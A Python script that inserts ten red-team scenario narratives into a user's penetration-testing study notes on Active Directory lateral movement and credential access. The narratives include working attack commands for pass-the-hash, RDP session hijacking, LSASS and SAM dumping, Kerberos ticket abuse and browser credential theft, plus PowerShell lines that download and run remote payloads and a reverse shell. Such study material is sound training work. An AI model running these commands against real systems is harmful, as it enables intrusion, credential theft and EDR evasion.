import subprocess
import os

scenarios = [
r'''During a recent red team engagement for a mid-sized financial institution, the team had established an initial foothold on a developer's workstation. After conducting internal network enumeration using BloodHound, the attacker identified that the developer's machine was in the same network segment as several Tier-2 jump servers. While the attacker lacked Domain Admin credentials, they had managed to extract the local Administrator NTLM hash from the developer's workstation. 

Knowing that organizations often use identical local administrator passwords across multiple machines, the attacker decided to test this hypothesis against the jump server. The attacker used `xfreerdp` with the Pass-the-Hash (PtH) technique, leveraging the `/pth` flag to authenticate to the jump server without needing the plaintext password.

```bash
xfreerdp /v:10.50.20.15 /u:Administrator /pth:8846f7eaee8fb117ad06bdd830b7586c /cert:ignore
```

The connection was successful; Restricted Admin Mode was fortunately enabled on the jump server. Once dropped into the GUI environment of the server, the attacker opened a command prompt and ran `query user` to inspect active and disconnected sessions.

```cmd
C:\> query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 administrator         rdp-tcp#0           1  Active          .  6/10/2026 10:00 AM
 svc_da_admin          rdp-tcp#1           2  Disc        02:30  6/10/2026 07:15 AM
```

The attacker noticed a disconnected session belonging to `svc_da_admin`, a known Domain Admin service account. Recognizing a prime opportunity for RDP Session Hijacking, the attacker escalated their command prompt to `SYSTEM` privileges using PsExec, which they had uploaded to the `C:\Temp` directory.

```cmd
C:\Temp\psexec.exe -s -i cmd.exe
```

A new terminal window popped up running as `NT AUTHORITY\SYSTEM`. From this highly privileged context, the attacker executed the built-in `tscon.exe` binary to forcefully hijack the disconnected session, mapping the `svc_da_admin` session (ID 2) directly into their current RDP window (Session ID 1).

```cmd
C:\Windows\System32\tscon.exe 2 /dest:rdp-tcp#0
```

Instantly, the screen flickered, and the attacker was staring at the desktop of the `svc_da_admin` user. The attacker didn't need to know the Domain Admin's password, bypass MFA, or trigger noisy authentication logs against the Domain Controller. With full Domain Admin context now hijacked, the attacker proceeded to access the central file shares containing sensitive customer data and began preparing for data exfiltration, achieving the primary objective of the assessment without triggering the organization's EDR alerts regarding credential dumping.
''',
r'''In a recent penetration test against an energy sector organization, the attackers managed to spear-phish a junior systems administrator, gaining a Beacon on their Windows 10 workstation. The organization had mature EDR deployments and heavily monitored SMB traffic (port 445) and RDP connections, making traditional lateral movement tools like PsExec or standard RDP highly risky. However, they heavily relied on PowerShell Remoting (WinRM over port 5985) for daily administrative tasks.

The attacker scraped the workstation's LSASS memory and recovered the plaintext credentials of the `admin_jdoe` account. Using these credentials, the attacker decided to leverage `Evil-WinRM`, a stealthy tool designed for PowerShell Remoting, from their Linux attack box tunneled through a SOCKS proxy.

```bash
proxychains4 evil-winrm -i 10.100.5.20 -u admin_jdoe -p 'Winter2025!'
```

The connection succeeded, granting an interactive PowerShell session on a critical internal file server. Realizing that dropping executables to disk would trigger the EDR, the attacker opted for purely in-memory execution. They hosted a malicious PowerShell payload on their attack server and used the WinRM session to download and execute it directly into memory.

```powershell
*Evil-WinRM* PS C:\Users\admin_jdoe\Documents> IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.55/payload.ps1')
```

The payload mapped a C2 framework stager into the memory space of the running `wsmprovhost.exe` process (the host process for WinRM sessions). The EDR completely ignored the activity because `wsmprovhost.exe` executing PowerShell scripts and making network connections was the established baseline behavior for this server during administrative tasks. 

Once the new Beacon checked in, the attacker enumerated the file server's local groups and discovered that a Domain Admin account was actively logged in. The attacker then used their in-memory access to inject a specialized token-stealing module, impersonating the Domain Admin and opening a direct path to compromise the primary Domain Controller. By utilizing WinRM, the attacker blended perfectly into the background noise of the organization's legitimate administrative operations, completely evading detection until the final stages of the attack.
''',
r'''During a targeted ransomware simulation for a manufacturing company, the red team had compromised a human resources workstation and managed to dump the local SAM database. They discovered that the local Administrator password was identical across all workstations in the `192.168.20.0/24` subnet. Eager to expand their footprint, the attackers looked towards the production line control servers.

The organization had strict firewall rules preventing RDP access between subnets, but port 445 (SMB) was open for file sharing and printer mapping. The attacker opted to use `smbexec.py` from the Impacket suite to laterally move to the critical `PROD-CTRL-01` server. Unlike PsExec, which uploads a visible binary service to the target, `smbexec.py` is significantly stealthier as it executes commands directly via the Windows command processor without leaving persistent executable files on disk.

```bash
smbexec.py WORKGROUP/Administrator@192.168.20.55 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

The command succeeded, providing the attacker with an interactive, semi-functional command prompt running as `NT AUTHORITY\SYSTEM` on the target server. The attacker knew that `smbexec.py` works by echoing command output to a temporary file in the `C:\` drive, reading it over SMB, and then deleting it. 

```cmd
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
PROD-CTRL-01
```

To establish a more stable and interactive C2 channel without triggering the legacy antivirus software installed on the server, the attacker decided to execute a living-off-the-land (LotL) payload. They used the `smbexec` prompt to invoke a heavily obfuscated PowerShell reverse shell. 

```cmd
C:\Windows\system32> powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.10.100:8000/rs.ps1')"
```

The reverse shell connected back to the attacker's infrastructure. By choosing `smbexec` over traditional `psexec`, the attacker bypassed the standard detections that look for the `PSEXESVC.exe` file creation and service installation events. Within hours, the attackers used their SYSTEM access on the control server to pivot further into the OT network, demonstrating a critical path for a potential ransomware deployment that could halt the factory's physical operations.
''',
r'''In an adversary simulation for a global logistics firm, the red team had obtained a low-privileged domain user's credentials and, through an excessive rights misconfiguration, found that this user belonged to the local Administrators group of the primary software deployment server (`DEPLOY-01`). The organization heavily monitored SMB service creations (like PsExec) and PowerShell usage due to recent ransomware scares. 

To bypass these restrictions and maintain a low profile, the attacker leveraged Windows Management Instrumentation (WMI) for lateral movement using Impacket's `wmiexec.py`. WMI relies on the DCOM protocol (port 135) and dynamic RPC ports, which are often permitted for enterprise management tools like SCCM.

```bash
wmiexec.py CORPDOMAIN/jdawson:'P@ssw0rd2026!'@10.200.5.15
```

The connection initiated successfully. Unlike PsExec, `wmiexec.py` does not upload a service executable. Instead, it instantiates the `Win32_Process` class to silently spawn `cmd.exe` processes on the target, reading the output from the `$ADMIN` share. This "fileless" lateral movement technique often bypasses basic antivirus checks.

```cmd
C:\> ipconfig /all
Windows IP Configuration
   Host Name . . . . . . . . . . . . : DEPLOY-01
   Primary Dns Suffix  . . . . . . . : corp.local
```

Once inside the `DEPLOY-01` server, the attacker needed a more robust Command and Control (C2) connection. To evade the strict EDR policies governing PowerShell, the attacker used the existing WMI prompt to deploy a specialized, compiled C# runner. They uploaded the binary via the built-in SMB share access that `wmiexec` inherently uses.

```cmd
C:\> put beacon.exe C:\Windows\Temp\updater.exe
C:\> C:\Windows\Temp\updater.exe
```

The `updater.exe` payload executed perfectly under the context of the local administrator. By utilizing WMI, the execution chain looked entirely native: the `WmiPrvSE.exe` (WMI Provider Host) process spawned the command prompt, which then executed the payload. This execution flow closely mimicked legitimate enterprise administrative software, allowing the red team to blend into the noise of standard administrative traffic. From this central deployment server, the attacker eventually pushed a benign "update" package to all workstations, simulating a massive enterprise-wide compromise.
''',
r'''During a compromise assessment for a telecommunications provider, an attacker had successfully phished an IT support technician, gaining local administrator privileges on their workstation. The attacker's primary goal was to obtain Domain Admin credentials to take over the Active Directory forest. Knowing that IT support staff frequently log into their machines with highly privileged accounts to perform administrative tasks, the attacker targeted the Local Security Authority Subsystem Service (`lsass.exe`) process memory, which caches credentials for active logon sessions.

The organization had deployed a robust Endpoint Detection and Response (EDR) solution that aggressively flagged and blocked known credential dumping tools like `mimikatz.exe`. To bypass this, the attacker decided to use a Living-off-the-Land (LotL) technique utilizing the built-in Windows `comsvcs.dll` library to dump the LSASS process memory to a file invisibly.

First, the attacker used a standard command prompt to identify the Process ID (PID) of `lsass.exe`.

```cmd
C:\> tasklist | findstr lsass
lsass.exe                      748 Services                   0     65,232 K
```

With the PID (748) identified, the attacker needed to execute the memory dump. Instead of running a suspicious executable, they used `rundll32.exe` to call the `MiniDump` export function of `comsvcs.dll`. To avoid alerting the EDR which monitors for command lines containing "lsass", they used PowerShell to craft the command dynamically.

```powershell
PS C:\> $pid_lsass = (Get-Process lsass).Id
PS C:\> rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $pid_lsass C:\Temp\lsass.dmp full
```

The EDR failed to block the action because `rundll32.exe` and `comsvcs.dll` are legitimate, signed Microsoft binaries. The attacker successfully generated the `lsass.dmp` file in the `C:\Temp` directory. To further obfuscate their actions, they immediately compressed and password-protected the dump file using the built-in `Compress-Archive` cmdlet and downloaded it to their attack machine.

```bash
# On the attacker's Linux machine
pypykatz lsa minidump lsass.dmp
```

Back on their offline attack infrastructure, the attacker ran `pypykatz` (a Python implementation of Mimikatz) against the extracted dump file. The analysis revealed the plaintext password of a Domain Admin account (`DA_Admin1`) that the IT technician had used earlier that day to map a network drive. With these highly privileged credentials in hand, the attacker immediately pivoted to the primary Domain Controller, achieving total domain compromise within minutes of the initial LSASS dump.
''',
r'''In a recent red team engagement evaluating a retail chain's point-of-sale (POS) network, the attackers managed to exploit a vulnerable web application running on a legacy Windows server in the DMZ. After escalating privileges to `NT AUTHORITY\SYSTEM` using a well-known kernel exploit (PrintNightmare), the attackers found themselves isolated; the server could not reach the internal Active Directory domain controllers due to strict firewall rules.

Unable to perform traditional domain enumeration or pass-the-hash attacks across the network, the attackers pivoted to extracting local credentials to see if password reuse could facilitate lateral movement. Their target was the local Security Account Manager (SAM) database and the LSA Secrets, which often store service account passwords, cached domain hashes, and VPN configurations.

The local EDR actively blocked tools like Mimikatz or heavily obfuscated PowerShell scripts attempting to read the SAM database directly. Therefore, the attacker opted to use the built-in Windows Volume Shadow Copy (VSS) service and standard registry commands to create offline backups of the necessary registry hives.

```cmd
C:\> reg save HKLM\SYSTEM C:\Temp\system.save
The operation completed successfully.

C:\> reg save HKLM\SAM C:\Temp\sam.save
The operation completed successfully.

C:\> reg save HKLM\SECURITY C:\Temp\security.save
The operation completed successfully.
```

These commands executed cleanly, as backing up registry hives is a common administrative task that EDRs rarely block outright. The attacker then compressed the three `.save` files into a single ZIP archive and exfiltrated them via an outbound HTTPS connection to their command-and-control server.

```bash
# On the attacker's offline Linux machine
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

Using Impacket's `secretsdump.py` on their local machine, the attacker extracted the NTLM hashes of all local accounts. Crucially, extracting the LSA Secrets (from the `SECURITY` hive) revealed a plaintext password for a legacy service account: `svc_backup : B@ckupR0utine2021!`. 

Testing this newly discovered password against the external VPN portal, the attackers found that the `svc_backup` account was still active in Active Directory and lacked Multi-Factor Authentication (MFA). By simply connecting to the VPN using the extracted plaintext password, the attackers bypassed the heavily fortified DMZ firewall, directly dropping into the internal corporate network and bypassing months of perimeter defense configurations.
''',
r'''During a penetration test for a university network, the attackers gained initial access through a compromised student workstation. Through careful local enumeration, they discovered a scheduled task running a backup script under the context of a local administrator. By modifying the script, they obtained a reverse shell running as `NT AUTHORITY\SYSTEM`.

The attackers dumped the local SAM database and extracted the NTLM hash of the built-in Administrator account. They knew that many organizations deploy standardized images where the built-in Administrator password is the same across all machines. However, the university's network heavily segmented traffic, blocking direct RDP access and tightly monitoring anomalous PowerShell activity.

The attacker needed to verify if the extracted hash was valid on other machines within the IT department's subnet without triggering account lockout alarms. They used CrackMapExec (CME) from their attacking machine, routing traffic through a SOCKS proxy established via their initial foothold.

```bash
proxychains4 crackmapexec smb 10.10.50.0/24 -u Administrator -H '31d6cfe0d16ae931b73c59d7e0c089c0' --local-auth
```

The scan quickly returned a result highlighting `IT-ADMIN-WS04` with a `(Pwn3d!)` flag, indicating that the local Administrator password was indeed reused and the hash was valid for full administrative access. 

To capitalize on this without dropping malicious files, the attacker utilized the Pass-the-Hash (PtH) technique natively through Windows via a tool called `Invoke-TheHash`. However, wanting to remain entirely off the radar, they decided to use a modified version of Impacket's `psexec.py` that had been customized to avoid uploading the standard `psexesvc.exe` binary.

```bash
proxychains4 psexec_custom.py WORKGROUP/Administrator@10.10.50.14 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

By authenticating purely with the NTLM hash via the SMB protocol, the attacker bypassed the need to crack the complex 24-character password. Once connected to `IT-ADMIN-WS04`, they discovered an open KeePass database containing the university's core infrastructure passwords. The PtH technique allowed them to seamlessly pivot from a low-value student machine to the epicenter of the IT department's administration network, demonstrating the severe impact of local administrator password reuse.
''',
r'''In a highly secure environment belonging to a defense contractor, the red team had compromised a system administrator's workstation. The organization had implemented strict NTLM restrictions, disabling NTLM authentication across the domain to thwart standard Pass-the-Hash (PtH) and relay attacks. The environment exclusively required Kerberos for all authentication to critical servers.

The attackers had previously dumped LSASS memory and extracted the NTLM hash for the user `admin_tsmith`, but they did not possess the plaintext password. Because standard PtH (which relies on NTLM) was blocked by Group Policy, the attackers needed to convert their NTLM hash into a valid Kerberos Ticket Granting Ticket (TGT). This technique is known as Over-Pass-the-Hash (or Pass-the-Key).

Using a customized, in-memory execution of Rubeus through their Command and Control framework, the attacker initiated the `asktgt` module. Rubeus uses the provided NTLM hash (the RC4 key) to encrypt a timestamp and request a TGT directly from the Domain Controller, entirely bypassing the local Windows API and avoiding standard credential guard mechanisms.

```cmd
C:\Temp> Rubeus.exe asktgt /user:admin_tsmith /domain:defense.local /rc4:9f2b4c8a6e7d8f9a0b1c2d3e4f5a6b7c /ptt
```

The command succeeded. The Domain Controller validated the RC4-encrypted timestamp and returned a legitimate Kerberos TGT for `admin_tsmith`. Rubeus automatically injected this newly acquired TGT into the attacker's current session memory (`/ptt` flag).

```cmd
C:\Temp> klist

Current LogonId is 0:0x3e7
Cached Tickets: (1)
#0>     Client: admin_tsmith @ DEFENSE.LOCAL
        Server: krbtgt/DEFENSE.LOCAL @ DEFENSE.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
```

With the TGT now injected, the attacker's session seamlessly masqueraded as `admin_tsmith`. When the attacker subsequently ran a PowerShell command to access a highly restricted engineering file share via its fully qualified domain name (`\\eng-share.defense.local\Blueprints`), Windows automatically used the injected TGT to request a Service Ticket.

Because the underlying authentication protocol used was purely Kerberos, the connection succeeded without triggering the network's NTLM denial alarms. The attacker successfully bypassed the restrictive authentication policies, bridging the gap between an extracted hash and a Kerberos-only environment to exfiltrate classified schematics.
''',
r'''During an adversary simulation for a cloud hosting provider, the attackers had established a foothold on a shared terminal server used by Level 1 support technicians. The objective was to escalate privileges to the Tier 0 infrastructure. Standard credential dumping techniques like Mimikatz or LSASS manipulation were heavily monitored and blocked by an aggressive EDR agent. 

Instead of targeting passwords or hashes, the attackers focused on Kerberos tickets residing in memory. When a user authenticates to a service, Kerberos Service Tickets (TGS) and Ticket Granting Tickets (TGT) are cached to facilitate Single Sign-On (SSO). The attacker realized that if they could extract a valid TGT belonging to a highly privileged user, they could inject it into their own session—a technique known as Pass-the-Ticket (PtT)—without needing to crack hashes or bypass NTLM restrictions.

The attacker utilized `Rubeus`, a C# tool set designed for Kerberos abuse, executing it purely in memory via an obfuscated PowerShell cradle to evade the EDR. They ran the `triage` command to list all cached tickets on the server.

```powershell
PS C:\> [Reflection.Assembly]::Load([Convert]::FromBase64String($RubeusBin)); [Rubeus.Program]::Main("triage".Split())
```

The output revealed a goldmine: a Domain Admin (`DA_admin1`) had recently logged onto the terminal server, and their TGT was still cached in memory and valid for another 8 hours. The attacker immediately used Rubeus to dump the specific ticket encoded in Base64 format.

```powershell
PS C:\> [Rubeus.Program]::Main("dump /luid:0x4f8a21 /service:krbtgt".Split())
```

With the Base64-encoded TGT extracted, the attacker copied the string and moved to a separate, entirely untrusted rogue laptop they had connected to the corporate guest network. The guest network had network line-of-sight to the Domain Controllers but was isolated from internal management zones.

On the rogue laptop, the attacker injected the stolen TGT into their local, unprivileged logon session using Rubeus.

```cmd
C:\> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQ...[truncated]
```

Instantly, the unprivileged session was granted the identity of `DA_admin1`. The attacker opened a standard command prompt and executed `dir \\Primary-DC.corp.local\C$`. Because the Kerberos ticket was perfectly valid and cryptographically signed by the Domain Controller, the authentication succeeded transparently. The attacker had achieved complete domain dominance without ever touching a password, extracting a hash, or triggering credential dumping alerts on the heavily monitored tier-0 servers.
''',
r'''In a targeted penetration test against a high-profile media company, the red team had compromised the workstation of the Chief Marketing Officer (CMO) via a malicious payload embedded in a PDF document. The CMO's workstation was exceptionally locked down: local administrator rights were revoked, AppLocker was enforced, and aggressive EDR monitored all processes. Escalating privileges to access LSASS or SAM databases was impossible under these constraints.

However, the attackers knew that executives frequently save their passwords in their web browsers for convenience. Given the restrictions, the attackers decided to pivot to targeting Google Chrome's local database and the Windows Credential Manager, operating entirely within the context of the currently logged-on user.

The attacker used a lightweight, compiled C# utility called `SharpChromium`, which is designed to extract cookies, history, and saved logins from Chromium-based browsers. To bypass AppLocker, they executed it entirely in-memory using the .NET reflection capabilities of their initial command-and-control beacon.

```powershell
PS C:\> [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($Base64SharpChromium))
PS C:\> [SharpChromium.Program]::Main("logins".Split())
```

The output flooded the terminal. `SharpChromium` automatically located the `Login Data` SQLite database in the CMO's `AppData` folder. Because the tool was running under the CMO's user context, it seamlessly utilized the Windows Data Protection API (DPAPI) to decrypt the passwords, requiring no administrative privileges or LSASS interaction.

```text
--- Chrome Logins ---
URL: https://corp-social-media.management.app/login
Username: cmo_executive@mediacorp.com
Password: Marketing_Vision_2025!
```

Alongside the Chrome data, the attacker also queried the built-in Windows Credential Manager using the native `cmdkey` utility, which revealed cached credentials for the corporate Azure environment.

```cmd
C:\> cmdkey /list
Currently stored credentials:
    Target: LegacyGeneric:target=AzureActiveDirectory
    Type: Domain Password
    User: cmo_executive@mediacorp.com
```

Armed with the extracted plaintext password from the browser, the attacker immediately tested it against the external corporate VPN and Office 365 portals. The password was valid. Since the CMO had "trusted" their mobile device for MFA, the attackers were able to initiate an MFA fatigue attack, eventually gaining full access to the CMO's email and social media management platforms. This devastating compromise was achieved entirely through user-land data extraction, completely bypassing the heavy OS-level security controls.
'''
]

files = [
"/home/sanchit/Notes/VAPT/Active Directory/I - 68 - AD Lateral Movement and Credential Access/01 - Lateral Movement via RDP and Hijacking Sessions.md",
"/home/sanchit/Notes/VAPT/Active Directory/I - 68 - AD Lateral Movement and Credential Access/02 - Lateral Movement via WinRM and PSRemoting.md",
"/home/sanchit/Notes/VAPT/Active Directory/I - 68 - AD Lateral Movement and Credential Access/03 - Lateral Movement via SMB PsExec SmbExec.md",
"/home/sanchit/Notes/VAPT/Active Directory/I - 68 - AD Lateral Movement and Credential Access/04 - Lateral Movement via WMI WMIExec.md",
"/home/sanchit/Notes/VAPT/Active Directory/I - 68 - AD Lateral Movement and Credential Access/05 - Dumping LSASS Memory Mimikatz Procdump Comsvcs.md",
"/home/sanchit/Notes/VAPT/Active Directory/I - 68 - AD Lateral Movement and Credential Access/06 - Dumping Local SAM and LSA Secrets.md",
"/home/sanchit/Notes/VAPT/Active Directory/I - 68 - AD Lateral Movement and Credential Access/07 - Pass-the-Hash PtH Mechanics and Execution.md",
"/home/sanchit/Notes/VAPT/Active Directory/I - 68 - AD Lateral Movement and Credential Access/08 - Over-Pass-the-Hash Pass-the-Key.md",
"/home/sanchit/Notes/VAPT/Active Directory/I - 68 - AD Lateral Movement and Credential Access/09 - Pass-the-Ticket PtT and Ticket Management.md",
"/home/sanchit/Notes/VAPT/Active Directory/I - 68 - AD Lateral Movement and Credential Access/10 - Extracting Credentials from Browsers and Credential Manager.md"
]

import sys

for idx, file_path in enumerate(files):
    if not os.path.exists(file_path):
        print(f"File missing: {file_path}")
        continue
    
    with open("/home/sanchit/Notes/VAPT/scenario.txt", "w") as f:
        f.write(scenarios[idx])
    
    cmd = ['python3', '/home/sanchit/Notes/VAPT/add_scenario.py', file_path]
    with open("/home/sanchit/Notes/VAPT/scenario.txt", "r") as stdin_f:
        result = subprocess.run(cmd, stdin=stdin_f, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"Successfully processed {os.path.basename(file_path)}")
        else:
            print(f"Error processing {os.path.basename(file_path)}: {result.stderr}")
